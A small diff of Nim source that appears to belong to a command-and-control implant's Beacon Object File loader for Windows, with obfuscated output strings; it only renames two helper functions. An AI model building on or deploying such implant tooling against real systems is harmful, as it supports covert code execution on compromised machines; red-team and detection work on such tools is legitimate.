@@ -4,7 +4,7 @@ import ../utils/strenc
 when defined(windows):
   import base64, strutils
   import winim/lean
-  import ../utils/[structs, b_functions, ptr_math]
+  import ../utils/[structs, beacon_functions, ptr_math]
   
   type
     InlineExecuteArgs = object
@@ -211,7 +211,7 @@ when defined(windows):
     
     output.add(obf("[+] BOF execution completed\n"))
     
-    let outData = BGOD(nil)
+    let outData = BeaconGetOutputData(nil)
     if outData != nil:
       output.add(obf("\n=== BOF Output ===\n") & $outData & obf("\n==================\n"))
     
